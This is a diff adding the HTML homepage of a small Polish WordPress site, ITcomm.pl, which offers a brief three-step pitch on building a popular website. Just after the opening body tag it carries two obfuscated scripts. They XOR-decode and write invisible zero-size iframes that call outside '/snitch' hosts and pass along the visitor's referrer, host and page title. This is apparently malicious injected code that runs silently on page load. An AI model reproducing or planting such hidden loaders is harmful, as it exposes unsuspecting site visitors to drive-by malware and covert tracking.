@@ -1,0 +1,166 @@
+<!doctype html>
+<!--[if lt IE 7 ]> <html class="no-js ie6" dir="ltr" lang="pl-PL"> <![endif]-->
+<!--[if IE 7 ]>    <html class="no-js ie7" dir="ltr" lang="pl-PL"> <![endif]-->
+<!--[if IE 8 ]>    <html class="no-js ie8" dir="ltr" lang="pl-PL"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--> <html class="no-js" dir="ltr" lang="pl-PL"> <!--<![endif]-->
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
+<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Droid+Sans:regular,bold" />
+<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Droid+Serif:regular,bold" />
+<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Fredericka+the+Great">
+
+<title>ITcomm.pl</title>
+<script>window.jQuery || document.write('<script src="http://code.jquery.com/jquery-1.7.2.min.js"><\/script>')</script>
+<link rel="alternate" type="application/rss+xml" title="ITcomm.pl &raquo; Kanał z wpisami" href="http://itcomm.pl/feed/" />
+<link rel="alternate" type="application/rss+xml" title="ITcomm.pl &raquo; Kanał z komentarzami" href="http://itcomm.pl/comments/feed/" />
+<link rel='stylesheet' id='pilotfish_main_style-css'  href='http://itcomm.pl/wp-content/themes/pilot-fish/style.css' type='text/css' media='all' />
+<script type='text/javascript' src='http://itcomm.pl/wp-content/themes/pilot-fish/js/modernizr.js'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://itcomm.pl/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://itcomm.pl/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 3.4.1" />
+<link rel='canonical' href='http://itcomm.pl/' />
+	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+	<style type="text/css">
+			.site-name,
+		.site-description {
+			position: absolute !important;
+			clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
+			clip: rect(1px, 1px, 1px, 1px);
+		}
+		</style>
+	<style type="text/css" id="custom-background-css">
+body.custom-background { background-color: #ffffff; }
+</style>
+</head>
+
+<body class="home page page-id-8 page-template-default custom-background">
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>                
+<div id="container" class="hentry">
+        <div id="header">
+    	    
+            <div id="logo">
+            <span class="site-name"><a href="http://itcomm.pl/" title="ITcomm.pl" rel="home">ITcomm.pl</a></span>
+            <span class="site-description">sposób na popularną stronę WWW</span>
+        </div><!-- end of #logo -->  
+        <nav id="access">
+	<div class="menu"><ul><li class="current_page_item"><a href="http://itcomm.pl/" title="Strona główna">Strona główna</a></li></ul></div>
+    </nav>
+    </div><!-- end of #header -->
+
+    	    <div id="wrapper" class="clearfix">
+
+            <div id="content-full" class="row span12" role="main">       
+
+		
+        
+            <article id="post-8" class="post-8 page type-page status-publish hentry">
+		
+
+
+
+
+
+               
+                <div class="post-entry">
+                    <hr />
+<div class="center">
+<h2>3 kroki do popularnej strony WWW</h2>
+</div>
+<hr />
+<div id="widgets" class="sidebar-home">
+<div class="row span4">
+<section id="sidebar-home-1" class="widgets-home">
+<div class="widget-inner"><img class="aligncenter" src="http://itcomm.pl/wp-content/themes/pilot-fish/images/bulb.png" alt="" /></p>
+<h3 class="center">Pomysł</h3>
+<div class="textwidget">Jest konieczny by wiedzieć jaki będzie układu oraz projekt graficzny strony.</div>
+</div>
+</section>
+</div>
+<p><!-- end of .span4 --></p>
+<div class="row span4">
+<section id="sidebar-home-2" class="widgets-home">
+<div class="widget-inner"><img class="aligncenter" src="http://itcomm.pl/wp-content/themes/pilot-fish/images/wheel.png" alt="" /></p>
+<h3 class="center">Tworzenie strony</h3>
+<div class="textwidget">To czas w którym nasz projekt gragiczny zamieniany jest na zrozumiały dla komputerów język.</div>
+</div>
+</section>
+</div>
+<p><!-- end of .span4 --></p>
+<div class="row span4 last">
+<section id="sidebar-home-3" class="widgets-home">
+<div class="widget-inner"><img class="aligncenter" src="http://itcomm.pl/wp-content/themes/pilot-fish/images/wrench.png" alt="" /></p>
+<h3 class="center">Pozycjonowanie i prace rozwojowe</h3>
+<div class="textwidget">Są niezbędne aby zaistnieć w internecie zdobyć odwiedzających i potencjalnych odbiorców.</div>
+<div class="textwidget"></div>
+</div>
+</section>
+</div>
+<p><!-- end of .span4 last --></p>
+</div>
+                    	<!-- Display children if page has children -->
+		<div class="page-hierarchy">             
+                		</div>
+		
+
+<footer class="post-data">
+			<div class="post-meta">
+                	
+				 
+                	</div><!-- end of .post-meta -->
+
+
+
+
+
+		</footer>
+
+
+
+
+
+
+
+
+           
+         
+        
+        
+      
+        </div><!-- end of #content-full -->
+
+           
+
+</div><!-- end of #wrapper -->
+</div><!-- end of #container -->
+
+<div id="footer" class="clearfix">
+    <div id="widgets-footer">   
+	    <div class="row span4">
+	     
+	    		    	    </div>
+	    
+	    <div class="row span4">
+	     
+	    		    	    </div>
+	    
+	    <div class="row span4 last">
+	     
+	    		    	    </div>
+</div> <!-- end of #widgets-footer -->
+          
+    <div id="copyright" class="clear">    
+        <div class="row span6 copyright">
+            <small>&copy; 2019 <a href="http://itcomm.pl/" title="ITcomm.pl">ITcomm.pl</a> powered by <a href="http://wordpress.org" title="WordPress">
+                    WordPress</a></small><br /><small>Theme by <a href="http://danielatwork.com" title="Daniel Zhao">
+                    Daniel Zhao</a></small>
+        </div><!-- end of .copyright -->
+        
+        <div class="row span6 last scroll-top"><small><a href="#" title="scroll to top">Back to Top</a></small></div><!-- end of .scroll-top -->      
+    </div><!-- end of #copyright -->
+
+</div><!-- end of #footer -->
+<script type='text/javascript' src='http://itcomm.pl/wp-content/themes/pilot-fish/js/main.js'></script>
+</body>
+</html>
